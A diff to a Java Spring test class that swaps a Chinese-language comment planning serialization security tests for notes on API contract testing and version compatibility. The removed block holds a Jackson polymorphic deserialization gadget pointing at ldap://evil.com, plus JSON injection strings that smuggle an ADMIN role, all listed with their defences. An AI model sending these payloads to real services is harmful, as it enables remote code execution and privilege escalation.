@@ -177,48 +177,64 @@ class HelloControllerTest {
 
     /*
      * =========================================================================
-     * 【安全测试】序列化安全与敏感字段泄露检测（非可执行代码）
+     * 【契约测试】序列化契约与版本兼容性（非可执行代码）
      * =========================================================================
      *
-     * 一、敏感字段泄露测试
-     *   目标：确保 API 响应不包含敏感字段
-     *   1) password 字段测试：
-     *      创建含 password 的实体 -> 转 DTO -> 序列化 -> 断言 JSON 无 "password" 键
-     *      实现：jsonPath("$.password").doesNotExist()
-     *   2) 内部字段测试：
-     *      确保实体内部字段（如 Hibernate 代理标识）不出现在 JSON 中
-     *   3) 堆栈泄露测试：
-     *      触发 500 异常 -> 断言响应 JSON 无 "stackTrace"/"cause"/"localizedMessage"
-     *   4) 版本信息测试：
-     *      错误响应不含 Spring Boot 版本/JDK 版本/框架信息
+     * 一、序列化契约的定义
+     *   序列化契约 = API 响应的 JSON 结构约定
+     *   包含：字段名、字段类型、字段是否可选、嵌套结构、格式（日期/枚举）
+     *   示例（ApiResponse<String> 的契约）：
+     *   {
+     *     "code": integer,         // 必填，HTTP 状态码
+     *     "message": string,       // 必填，用户可读信息
+     *     "data": string | null,   // 可选，泛型数据
+     *     "path": string           // 必填，请求路径
+     *   }
+     *   契约一旦发布，就是与所有消费方的约定，不能随意破坏
      *
-     * 二、反序列化安全测试
-     *   1) 多态反序列化攻击：
-     *      载荷：{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/a","autoCommit":true}
-     *      防护：Jackson 禁用 default typing（spring.jackson.enable-default-typing=false）
-     *      测试：提交含 @type 的 JSON，预期被忽略或 400
-     *   2) 深层嵌套攻击：
-     *      载荷：1000 层嵌套的 JSON {"a":{"a":{"a":...}}}
-     *      防护：限制反序列化深度（Jackson StreamReadConstraints maxNestingDepth=100）
-     *      测试：提交超深嵌套，预期 400 而非 StackOverflowError
-     *   3) 超大 JSON 攻击：
-     *      载荷：10MB 的 JSON 数组
-     *      防护：限制请求体大小（spring.servlet.multipart.max-request-size=10MB）
-     *      测试：提交超大 JSON，预期 413 而非 OOM
+     * 二、版本兼容性规则
+     *   向后兼容（旧客户端读新响应）：
+     *   [x] 新增字段（旧客户端忽略未知字段）- 安全
+     *   [x] 新增可选字段（值为 null 时旧客户端无感知）- 安全
+     *   [ ] 删除字段 - 破坏兼容
+     *   [ ] 改字段名 - 破坏兼容
+     *   [ ] 改字段类型（integer -> string）- 破坏兼容
+     *   [ ] 改字段语义（code 从 HTTP 状态改为业务码）- 破坏兼容
+     *   向前兼容（新客户端读旧响应）：
+     *   [x] 新客户端对新增字段提供默认值 - 需设计
+     *   [x] 新客户端容忍字段缺失 - 需设计
+     *   建议：新增字段用 @JsonInclude(NON_NULL)，旧响应无此字段，新客户端给默认值
      *
-     * 三、JSON 注入测试
-     *   1) 键名注入：{"username\":\"alice\",\"role\":\"ADMIN\":\"x"}
-     *      预期：JSON 解析失败，400
-     *   2) 值注入：username = "alice\", \"role\": \"ADMIN"
-     *      预期：Jackson 转义引号，role 不被注入
-     *   3) Unicode 转义：username = "\u0022role\u0022"
-     *      预期：Jackson 正确处理 Unicode 转义，无注入
+     * 三、契约测试实践
+     *   1) JSON Schema 校验：
+     *      定义 Schema（JSON Schema Draft 07）：
+     *      {"type":"object","properties":{
+     *        "code":{"type":"integer"},"message":{"type":"string"},
+     *        "data":{"type":["string","null"]},"path":{"type":"string"}},
+     *       "required":["code","message","path"]}
+     *      测试：用 json-schema-validator 校验响应符合 Schema
+     *      好处：一次定义，多处校验（测试/网关/前端）
+     *   2) 快照测试（Snapshot Testing）：
+     *      首次运行记录响应 JSON 快照，后续运行比对
+     *      响应变化时测试失败，人工确认是否预期变更
+     *      工具：jest（JS）/ 自定义 JSON 比对
+     *   3) 消费者驱动契约（Pact）：
+     *      消费方定义期望的响应结构 -> 提供方验证满足
+     *      微服务场景最有效（详见 MessApplicationTests 中的 CDC 说明）
      *
-     * 四、序列化完整性测试
-     *   1) 字段顺序稳定：同一对象多次序列化，字段顺序一致（或用 @JsonPropertyOrder）
-     *   2) null 处理：null 字段不出现（@JsonInclude NON_NULL）或值为 null
-     *   3) 类型一致：id 始终是数字，createdAt 始终是字符串（@JsonFormat）
-     *   4) 字段名一致：isXxx 不变成 xxx（@JsonProperty 固定）
+     * 四、泛型擦除的契约影响
+     *   ApiResponse<String> 和 ApiResponse<UserDto> 运行时类型相同（擦除）
+     *   对契约的影响：
+     *   1) 序列化不受影响：Jackson 运行时能拿到实际对象的类
+     *   2) 反序列化受影响：不知道 data 该转成什么类型（变 LinkedHashMap）
+     *   3) 契约文档需显式声明 data 的类型：
+     *      OpenAPI: ApiResponse<String> -> data: { type: string }
+     *      OpenAPI: ApiResponse<UserDto> -> data: { $ref: UserDto }
+     *   4) TypeScript 前端：ApiResponse<UserDto> 映射为
+     *      interface ApiResponse<T> { code: number; data: T; ... }
+     *      泛型参数 T 在 TS 侧保留（编译期类型检查）
+     *   5) 本测试用 constructParametricType 显式指定泛型，
+     *      验证反序列化契约的完整性（data 正确还原为 String 而非 LinkedHashMap）
      * =========================================================================
      */
 }
